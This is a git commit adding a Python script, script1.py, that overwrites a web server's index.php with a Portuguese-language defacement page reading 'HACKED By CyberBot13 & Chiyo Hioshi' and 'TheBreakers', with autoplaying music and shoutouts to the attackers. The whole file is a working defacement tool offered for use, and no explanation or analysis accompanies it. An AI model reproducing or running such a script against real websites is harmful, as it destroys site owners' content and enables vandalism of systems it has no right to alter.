d864ef3dbad77e96f1b774682608bf9e67a9b919
BrunoBRshazam <32942302+BrunoBRshazam@users.noreply.github.com>
2018-07-31 11:30:06 -0500

    Add files via upload

---
+++ script1.py
@@ -0,0 +1,41 @@
+#!/usr/bin/python
+# coding=utf-8
+arquivo=open('/var/www/bancocn/index.php','w')
+arquivo.write("""
+<!DOCTYPE html>
+<html>
+<head>
+<title>HACKED By CyberBot13 & Chiyo Hioshi</title>
+<meta charset="utf-8">
+<script type="text/javascript">
+//<![CDATA[
+try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"ed596ec31a7dd8158e7ae95b62cf5d4c",petok:"18c371a46f4e5a65bc0d7fcb0ca095f3278ef254-1477849289-1800",zone:"pagebin.com",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=088620b277/cloudflare.min.js"><'+'\/script>');}}catch(e){};
+//]]>
+</script>
+<link href='http://fonts.googleapis.com/css?family=Indie+Flower|Lobster|Iceland|VT323|Press+Start+2P|Courier+New' rel='stylesheet' type='text/css'>
+<link rel="shortcut icon" href="http://www.acsmce.com.br/wp-content/uploads/2012/11/pcc.png">
+</head>
+<body>
+<style type="text/css">body{background:transparent !important}</style><div style="position:fixed;z-index:-99;width:100%;height:100%;left:0px;top:0px"><iframe allow="autoplay" frameborder="0" height="100%" width="100%" 
+src="https://www.youtube.com/embed/UWJ2mO8nNpk?autoplay=1&amp;controls=0&amp;loop=1&amp;showinfo=0&amp;modestbranding=1&amp;disablekb=1&amp;enablejsapi=1&amp;playlist=UWJ2mO8nNpk"></iframe><!--CyberBot13--></div>
+<center>
+<font face="Indie Flower" color="white" size="3">Seu <strong>site</strong> foi defaced por</font>
+<br>
+<font face="VT323" color="BC062C" size="10"><strong>TheBreakers</strong></font>
+<br>
+<img src="https://www.amoeba.com/admin/uploads/blog/Kelly/grant_r_spring-breakers_tigersuits.jpg" height="100" width="300">
+<br>
+<font face="Indie Flower" color="white" size="5">"Saia daqui e procure o que fazer"
+<font face="Indie Flower" color="BC062C" size="5"> - TheBreakers
+<font face="Indie Flower" color="white" size="5">!
+</font></font></font>
+<hr color="BC062C">
+<br><font color="BC062C" size=4 face="Indie Flower"><strong>SALVES:</strong>
+<br>
+<center><strong>[<marquee align="center" scrollamount="5" width="560" style="width: 560px;"><font color="white" size="3"></center>BrunoCyberBot13<script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>  / Chiyo Hoshi</font></marquee>]</strong><br><br>
+<hr color="BC062C">
+</center>
+</body>
+</html>
+""")
+arquivo.close()
